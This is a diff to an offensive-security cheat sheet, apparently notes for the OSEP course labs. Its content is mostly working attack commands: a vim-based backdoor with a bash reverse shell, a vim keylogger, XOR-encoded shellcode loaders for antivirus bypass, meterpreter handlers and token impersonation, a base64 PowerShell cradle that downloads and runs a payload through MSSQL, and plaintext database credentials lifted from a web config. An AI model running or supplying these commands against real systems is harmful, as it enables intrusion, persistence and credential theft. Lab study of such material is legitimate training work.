@@ -611,18 +611,14 @@ xfreerdp /u:Offsec /v:127.0.0.1 /p:lab
 # linux post exploitation
 
 ## vim (privileged) backdoor
-
 edit `.bashrc` and append:
-
 ```
 alias sudo="sudo -E"
 ```
-
 update bash environment
 ```
 source ~/.bashrc
 ```
-
 create a vim run script
 ```
 vim ~/.vimrunscript
@@ -630,20 +626,14 @@ vim ~/.vimrunscript
 # payload, reverse shell example
 bash -i >& /dev/tcp/192.168.49.102/443 0>&1
 ```
-
 edit/create '.vimrc' and append
 ```
 :silent !source ~/.vimrunscript
 ```
-
 every time the victim user runs vim it will execute our backdoor payload
-
 ## vim privesc
-
 if user can run sudo vim, once you are inside vim run `:shell`
-
 ## vim keylogger
-
 append to `/home/offsec/.vim/plugin/settings.vim`
 ```
 mkdir -p ~/.vim/plugin/
@@ -653,21 +643,18 @@ vim ~/.vim/plugin/settings.vim
 :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
 :endif
 ```
-
 ## linux shellcode loader with AV bypass
-
-use `simpleLoader.c` in `OSEP-Code-Snippets/linux_shellcode_loaders` with `simpleXORencoder.c`
-
+`OSEP-Code-Snippets/linux_shellcode_loaders/simpleLoader.c` with `simpleXORencoder.c`
 ```
-if you want to use a meterpreter payload
-sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.206; set lport 443; exploit"
+sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.246; set lport 443; exploit"
+
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.167 LPORT=443 -f c
 - replace shell code in simpleXORencoder.c
-- gcc simpleXORencoder.c -o simpleXORencoder && ./simpleXORencoder
-- replace shell code in simpleLoader.c with output of simpleXORencoder
-- (on victim) gcc -o simpleLoader simpleLoader.c -z execstack
-```
+gcc simpleXORencoder.c -o simpleXORencoder && ./simpleXORencoder
 
+- replace shell code in simpleLoader.c with output of simpleXORencoder; (on victim):
+gcc -o simpleLoader simpleLoader.c -z execstack
+```
 ## LD_LIBRARY_PATH
 
 ```
@@ -872,16 +859,28 @@ meterpreter > impersonate_token corp1\\admin
 
 # return back to system
 rev2self
-
-# troubleshoot
+```
+### troubleshooting
+```
 - if you can't run getuid ()"stdapi_sys_config_getuid: Operation failed: Access is denied.") or shell:
+meterpreter > rev2self
 meterpreter > ps
 ...
 3388   752   notepad.exe              x64   0        domain\user_you_want_to_impersonate  C:\Windows\System32\notepad.exe
 ...
 meterpreter > migrate 3388
-```
 
+# if you run shell but only a process created e.g.
+meterpreter > impersonate_token 'SomeDomain\SomeUser'
+[+] Delegation token available
+[+] Successfully impersonated user  XXXXX
+meterpreter > shell
+Process 2016 created.
+Channel 4 created.
+meterpreter >
+
+"its a bug, you can get around in multiple ways, including spawning a process (execute -H -m -f cmd.exe) and then migrating to it, or just migrating to your selected user's process and then dropping to shell after a rev2self, or any one of a ton of ways like that"
+```
 # mimikatz
 ```
 Use Invoke-Mimikatz to run
@@ -1388,7 +1387,19 @@ sudo responder -I tun0
 
 C:\Users\admin.CORP1>MSSQL.exe
 ```
+sometimes you will need to enumerate the server to obtain credentials
+```
+# example: challenge 2
+type C:\inetpub\wwwroot\search.asp
+...
+ConnString="DRIVER={SQL Server};SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music"
+...
 
+# replace the standard connection string
+conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
+# with this one
+conStr = "SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music";
+```
 ## stealing/relaying creds
 ```
 # relay ntlmv2 hash with impacket
@@ -1426,6 +1437,20 @@ res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; E
 # method 2:  sp_OACreate
 res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
 ```
+
+```
+# executing shellcode runner
+# generate b64 powershell payload
+pwsh
+PS> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/run.txt') | IEX"))
+KABOA...FAFgA
+# putting it into OSEP-Code-Snippets/MSSQL
+...
+String cmd = "powershell -enc KABOA...FAFgA";
+...
+```
+
+## custom assemblies (user defined functions udf)
 `OSEP-Code-Snippets/mssql_custom_assemblies`
 ```
 # by default 'msdb' database has TRUSTWORTHY but custom databases may use it as well
@@ -1576,7 +1601,7 @@ Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"
 - SYSTEM is domained joined (as a computer object), upgrade to SYSTEM user via printspoofer
 ```
 ### manual approach
-attacker must wait for a victim to access a service that has unconstrained delegation
+attacker must wait for a victim to access a machine that has unconstrained delegation
 this example: admin user is visiting `http://appsrv01` from a client machine which stores the TGT in memory
 ```
 # on the appsrv01 machine as user offsec open powershell with admin priv and -ep bypass
